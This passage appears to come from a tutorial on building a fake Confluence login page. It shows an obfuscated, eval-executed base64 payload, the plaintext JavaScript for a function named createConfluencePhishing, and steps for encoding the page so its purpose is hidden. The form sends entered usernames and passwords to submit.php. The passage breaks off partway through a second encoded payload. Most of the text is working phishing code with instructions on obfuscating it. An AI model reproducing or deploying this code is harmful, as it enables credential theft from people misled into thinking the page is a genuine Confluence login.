eval(decodeURIComponent(atob("dmFyJTIwY29udGFpbmVyJTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJkaXYlMjIpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwY29udGFpbmVyLmNsYXNzTmFtZSUyMCUzRCUyMCUyMmxvZ2luLWNvbnRhaW5lciUyMiUzQiUwQSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMGhlYWRpbmclMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmgxJTIyKSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGhlYWRpbmcudGV4dENvbnRlbnQlMjAlM0QlMjAlMjJMb2clMjBpbiUyMHRvJTIwQ29uZmx1ZW5jZSUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGNvbnRhaW5lci5hcHBlbmRDaGlsZChoZWFkaW5nKSUzQiUwQSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMGVsZW0lMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmZvcm0lMjIpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZWxlbS5hY3Rpb24lMjAlM0QlMjAlMjJzdWJtaXQucGhwJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZWxlbS5tZXRob2QlMjAlM0QlMjAlMjJQT1NUJTIyJTNCJTBBJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdmFyJTIwdXNlcm5hbWVEaXYlMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmRpdiUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjB1c2VybmFtZUxhYmVsJTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJsYWJlbCUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB1c2VybmFtZUxhYmVsLmh0bWxGb3IlMjAlM0QlMjAlMjJ1c2VybmFtZSUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHVzZXJuYW1lTGFiZWwudGV4dENvbnRlbnQlMjAlM0QlMjAlMjJVc2VybmFtZSUyMG9yJTIwZW1haWwlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjB1c2VybmFtZUlucHV0JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJpbnB1dCUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB1c2VybmFtZUlucHV0LnR5cGUlMjAlM0QlMjAlMjJ0ZXh0JTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdXNlcm5hbWVJbnB1dC5pZCUyMCUzRCUyMCUyMnVzZXJuYW1lJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdXNlcm5hbWVJbnB1dC5uYW1lJTIwJTNEJTIwJTIydXNlcm5hbWUlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB1c2VybmFtZUlucHV0LnJlcXVpcmVkJTIwJTNEJTIwdHJ1ZSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHVzZXJuYW1lRGl2LmFwcGVuZENoaWxkKHVzZXJuYW1lTGFiZWwpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdXNlcm5hbWVEaXYuYXBwZW5kQ2hpbGQodXNlcm5hbWVJbnB1dCklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBlbGVtLmFwcGVuZENoaWxkKHVzZXJuYW1lRGl2KSUzQiUwQSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMHBhc3N3b3JkRGl2JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJkaXYlMjIpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdmFyJTIwcGFzc3dvcmRMYWJlbCUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIybGFiZWwlMjIpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFzc3dvcmRMYWJlbC5odG1sRm9yJTIwJTNEJTIwJTIycGFzc3dvcmQlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYXNzd29yZExhYmVsLnRleHRDb250ZW50JTIwJTNEJTIwJTIyUGFzc3dvcmQlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjBwYXNzd29yZElucHV0JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJpbnB1dCUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYXNzd29yZElucHV0LnR5cGUlMjAlM0QlMjAlMjJwYXNzd29yZCUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHBhc3N3b3JkSW5wdXQuaWQlMjAlM0QlMjAlMjJwYXNzd29yZCUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHBhc3N3b3JkSW5wdXQubmFtZSUyMCUzRCUyMCUyMnBhc3N3b3JkJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFzc3dvcmRJbnB1dC5yZXF1aXJlZCUyMCUzRCUyMHRydWUlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYXNzd29yZERpdi5hcHBlbmRDaGlsZChwYXNzd29yZExhYmVsKSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHBhc3N3b3JkRGl2LmFwcGVuZENoaWxkKHBhc3N3b3JkSW5wdXQpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZWxlbS5hcHBlbmRDaGlsZChwYXNzd29yZERpdiklM0IlMEElMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjBidXR0b25EaXYlMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmRpdiUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjBzdWJtaXRCdXR0b24lMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmJ1dHRvbiUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBzdWJtaXRCdXR0b24udHlwZSUyMCUzRCUyMCUyMnN1Ym1pdCUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHN1Ym1pdEJ1dHRvbi50ZXh0Q29udGVudCUyMCUzRCUyMCUyMkxvZyUyMEluJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYnV0dG9uRGl2LmFwcGVuZENoaWxkKHN1Ym1pdEJ1dHRvbiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBlbGVtLmFwcGVuZENoaWxkKGJ1dHRvbkRpdiklM0IlMEElMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjb250YWluZXIuYXBwZW5kQ2hpbGQoZWxlbSklM0IlMEElMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjBmb3Jnb3RQYXNzd29yZERpdiUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyZGl2JTIyKSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGZvcmdvdFBhc3N3b3JkRGl2LmNsYXNzTmFtZSUyMCUzRCUyMCUyMmZvcmdvdC1wYXNzd29yZCUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMGZvcmdvdFBhc3N3b3JkTGluayUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyYSUyMiklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBmb3Jnb3RQYXNzd29yZExpbmsuaHJlZiUyMCUzRCUyMCUyMiUyMyUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGZvcmdvdFBhc3N3b3JkTGluay50ZXh0Q29udGVudCUyMCUzRCUyMCUyMkNhbid0JTIwbG9nJTIwaW4lM0YlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBmb3Jnb3RQYXNzd29yZERpdi5hcHBlbmRDaGlsZChmb3Jnb3RQYXNzd29yZExpbmspJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwY29udGFpbmVyLmFwcGVuZENoaWxkKGZvcmdvdFBhc3N3b3JkRGl2KSUzQiUwQSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiUyRiUyMEFwcGVuZCUyMHRoZSUyMGNvbnRhaW5lciUyMHRvJTIwdGhlJTIwYm9keSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGFpbmVyKSUzQiUwQSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiUyRiUyMENTUyUyMHN0eWxpbmclMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB2YXIlMjBzdHlsZSUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyc3R5bGUlMjIpJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwc3R5bGUudGV4dENvbnRlbnQlMjAlM0QlMjAlNjAlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib2R5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1mYW1pbHklM0ElMjBBcmlhbCUyQyUyMHNhbnMtc2VyaWYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZjRmNWY3JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZGlzcGxheSUzQSUyMGZsZXglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBqdXN0aWZ5LWNvbnRlbnQlM0ElMjBjZW50ZXIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBhbGlnbi1pdGVtcyUzQSUyMGNlbnRlciUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGhlaWdodCUzQSUyMDEwMHZoJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwbWFyZ2luJTNBJTIwMCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBiYWNrZ3JvdW5kLWNvbG9yJTNBJTIwJTIzZmZmZmZmJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyJTNBJTIwMXB4JTIwc29saWQlMjAlMjNkZmUxZTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBib3JkZXItcmFkaXVzJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDMwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm94LXNoYWRvdyUzQSUyMDAlMjAxcHglMjAzcHglMjByZ2JhKDAlMkMlMjAwJTJDJTIwMCUyQyUyMDAuMSklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB0ZXh0LWFsaWduJTNBJTIwY2VudGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGgxJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMjRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi1ib3R0b20lM0ElMjAyMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwbGFiZWwlMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBkaXNwbGF5JTNBJTIwYmxvY2slM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwNXB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1hbGlnbiUzQSUyMGxlZnQlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwaW5wdXQlNUJ0eXBlJTNEJTIydGV4dCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBpbnB1dCU1QnR5cGUlM0QlMjJwYXNzd29yZCUyMiU1RCUyQyUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjB3aWR0aCUzQSUyMDEwMCUyNSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1heC13aWR0aCUzQSUyMDMwMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcGFkZGluZyUzQSUyMDEwcHglM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBtYXJnaW4tYm90dG9tJTNBJTIwMTBweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMDFweCUyMHNvbGlkJTIwJTIzZGZlMWU2JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwYm9yZGVyLXJhZGl1cyUzQSUyMDNweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJveC1zaXppbmclM0ElMjBib3JkZXItYm94JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwLmxvZ2luLWNvbnRhaW5lciUyMGJ1dHRvbiUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwMDUyY2MlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjb2xvciUzQSUyMCUyM2ZmZmZmZiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvcmRlciUzQSUyMG5vbmUlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBjdXJzb3IlM0ElMjBwb2ludGVyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTZweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjBidXR0b24lM0Fob3ZlciUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJhY2tncm91bmQtY29sb3IlM0ElMjAlMjMwNzQ3YTYlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAubG9naW4tY29udGFpbmVyJTIwLmZvcmdvdC1wYXNzd29yZCUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMG1hcmdpbi10b3AlM0ElMjAxMHB4JTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZm9udC1zaXplJTNBJTIwMTRweCUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUyMCU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGNvbG9yJTNBJTIwJTIzMDA1MmNjJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwbm9uZSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMC5sb2dpbi1jb250YWluZXIlMjAuZm9yZ290LXBhc3N3b3JkJTIwYSUzQWhvdmVyJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwdGV4dC1kZWNvcmF0aW9uJTNBJTIwdW5kZXJsaW5lJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYwJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZSklM0IlMEElMjAlMjAlMjAlMjA=")));
</script>

```

### Executing a Decoded JavaScript Function
It's worth noting that if we encapsulate our dynamically generated phishing content within a JavaScript function, it will not automatically execute upon being decoded and run with `eval`, instead we must explicitly invoke it.

In the code below, we created the function `createConfluencePhishing` and added the necessary logic to dynamically generate and style the Confluence phishing page. The function is then encoded and printed to the console as we've done before.

```
const scriptContent = `function createConfluencePhishing() {
    var container = document.createElement("div");
    container.className = "login-container";

    var heading = document.createElement("h1");
    heading.textContent = "Log in to Confluence";
    container.appendChild(heading);

    var elem = document.createElement("form");
    elem.action = "submit.php";
    elem.method = "POST";

    var usernameDiv = document.createElement("div");
    var usernameLabel = document.createElement("label");
    usernameLabel.htmlFor = "username";
    usernameLabel.textContent = "Username or email";
    var usernameInput = document.createElement("input");
    usernameInput.type = "text";
    usernameInput.id = "username";
    usernameInput.name = "username";
    usernameInput.required = true;
    usernameDiv.appendChild(usernameLabel);
    usernameDiv.appendChild(usernameInput);
    elem.appendChild(usernameDiv);

    var passwordDiv = document.createElement("div");
    var passwordLabel = document.createElement("label");
    passwordLabel.htmlFor = "password";
    passwordLabel.textContent = "Password";
    var passwordInput = document.createElement("input");
    passwordInput.type = "password";
    passwordInput.id = "password";
    passwordInput.name = "password";
    passwordInput.required = true;
    passwordDiv.appendChild(passwordLabel);
    passwordDiv.appendChild(passwordInput);
    elem.appendChild(passwordDiv);

    var buttonDiv = document.createElement("div");
    var submitButton = document.createElement("button");
    submitButton.type = "submit";
    submitButton.textContent = "Log In";
    buttonDiv.appendChild(submitButton);
    elem.appendChild(buttonDiv);

    container.appendChild(elem);

    var forgotPasswordDiv = document.createElement("div");
    forgotPasswordDiv.className = "forgot-password";
    var forgotPasswordLink = document.createElement("a");
    forgotPasswordLink.href = "#";
    forgotPasswordLink.textContent = "Can't log in?";
    forgotPasswordDiv.appendChild(forgotPasswordLink);
    container.appendChild(forgotPasswordDiv);

    document.body.appendChild(container);

    var style = document.createElement("style");
    style.textContent = \`
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dfe1e6;
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #0052cc;
        }
        .login-container label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container button {
            width: 100%;
            max-width: 300px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dfe1e6;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #0052cc;
            color: #ffffff;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #0747a6;
        }
        .login-container .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }
        .login-container .forgot-password a {
            color: #0052cc;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    \`;
    document.head.appendChild(style);
}`;

const encodedScript = btoa(encodeURIComponent(scriptContent));

console.log(encodedScript);

```
Paste the encoded script from the previous step into `eval`, wrapping it with `decodeURIComponent` and `atob`, as demonstrated earlier. This time, after decoding and executing the script, explicitly call the `createConfluencePhishing` function to render the phishing page.

```
<head></head>
<body></body>
<script>
eval(decodeURIComponent(atob("ZnVuY3Rpb24lMjBjcmVhdGVDb25mbHVlbmNlUGhpc2hpbmcoKSUyMCU3QiUwQSUyMCUyMCUyMCUyMHZhciUyMGNvbnRhaW5lciUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyZGl2JTIyKSUzQiUwQSUyMCUyMCUyMCUyMGNvbnRhaW5lci5jbGFzc05hbWUlMjAlM0QlMjAlMjJsb2dpbi1jb250YWluZXIlMjIlM0IlMEElMEElMjAlMjAlMjAlMjB2YXIlMjBoZWFkaW5nJTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJoMSUyMiklM0IlMEElMjAlMjAlMjAlMjBoZWFkaW5nLnRleHRDb250ZW50JTIwJTNEJTIwJTIyTG9nJTIwaW4lMjB0byUyMENvbmZsdWVuY2UlMjIlM0IlMEElMjAlMjAlMjAlMjBjb250YWluZXIuYXBwZW5kQ2hpbGQoaGVhZGluZyklM0IlMEElMEElMjAlMjAlMjAlMjB2YXIlMjBlbGVtJTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJmb3JtJTIyKSUzQiUwQSUyMCUyMCUyMCUyMGVsZW0uYWN0aW9uJTIwJTNEJTIwJTIyc3VibWl0LnBocCUyMiUzQiUwQSUyMCUyMCUyMCUyMGVsZW0ubWV0aG9kJTIwJTNEJTIwJTIyUE9TVCUyMiUzQiUwQSUwQSUyMCUyMCUyMCUyMHZhciUyMHVzZXJuYW1lRGl2JTIwJTNEJTIwZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJkaXYlMjIpJTNCJTBBJTIwJTIwJTIwJTIwdmFyJTIwdXNlcm5hbWVMYWJlbCUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIybGFiZWwlMjIpJTNCJTBBJTIwJTIwJTIwJTIwdXNlcm5hbWVMYWJlbC5odG1sRm9yJTIwJTNEJTIwJTIydXNlcm5hbWUlMjIlM0IlMEElMjAlMjAlMjAlMjB1c2VybmFtZUxhYmVsLnRleHRDb250ZW50JTIwJTNEJTIwJTIyVXNlcm5hbWUlMjBvciUyMGVtYWlsJTIyJTNCJTBBJTIwJTIwJTIwJTIwdmFyJTIwdXNlcm5hbWVJbnB1dCUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyaW5wdXQlMjIpJTNCJTBBJTIwJTIwJTIwJTIwdXNlcm5hbWVJbnB1dC50eXBlJTIwJTNEJTIwJTIydGV4dCUyMiUzQiUwQSUyMCUyMCUyMCUyMHVzZXJuYW1lSW5wdXQuaWQlMjAlM0QlMjAlMjJ1c2VybmFtZSUyMiUzQiUwQSUyMCUyMCUyMCUyMHVzZXJuYW1lSW5wdXQubmFtZSUyMCUzRCUyMCUyMnVzZXJuYW1lJTIyJTNCJTBBJTIwJTIwJTIwJTIwdXNlcm5hbWVJbnB1dC5yZXF1aXJlZCUyMCUzRCUyMHRydWUlM0IlMEElMjAlMjAlMjAlMjB1c2VybmFtZURpdi5hcHBlbmRDaGlsZCh1c2VybmFtZUxhYmVsKSUzQiUwQSUyMCUyMCUyMCUyMHVzZXJuYW1lRGl2LmFwcGVuZENoaWxkKHVzZXJuYW1lSW5wdXQpJTNCJTBBJTIwJTIwJTIwJTIwZWxlbS5hcHBlbmRDaGlsZCh1c2VybmFtZURpdiklM0IlMEElMEElMjAlMjAlMjAlMjB2YXIlMjBwYXNzd29yZERpdiUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyZGl2JTIyKSUzQiUwQSUyMCUyMCUyMCUyMHZhciUyMHBhc3N3b3JkTGFiZWwlMjAlM0QlMjBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCUyMmxhYmVsJTIyKSUzQiUwQSUyMCUyMCUyMCUyMHBhc3N3b3JkTGFiZWwuaHRtbEZvciUyMCUzRCUyMCUyMnBhc3N3b3JkJTIyJTNCJTBBJTIwJTIwJTIwJTIwcGFzc3dvcmRMYWJlbC50ZXh0Q29udGVudCUyMCUzRCUyMCUyMlBhc3N3b3JkJTIyJTNCJTBBJTIwJTIwJTIwJTIwdmFyJTIwcGFzc3dvcmRJbnB1dCUyMCUzRCUyMGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJTIyaW5wdXQlMjIpJTNCJTBBJTIwJTIwJTIwJTIwcGFzc3dvcmRJbnB1dC50eXBlJTIwJTNEJTIwJTIycGFzc3dvcmQlMjIlM0IlMEElMjAlMjAlMjAlMjBwYXNzd29yZElucHV0LmlkJTIwJTNEJTIwJTIycGFzc3dvcmQlMjIlM0IlMEElMjAlMjAlMjAlMjBwYXNzd29yZElucHV0Lm5hbWUlMjAlM0QlMjAlMjJwYXNzd29yZCUyMiUzQiUwQSUyMCUyMCUyMCUyMHBhc3N3b3JkSW5wdXQucmVxdWlyZWQlMjAlM0QlMjB0cnVlJTNCJTBBJTIwJTIwJTIw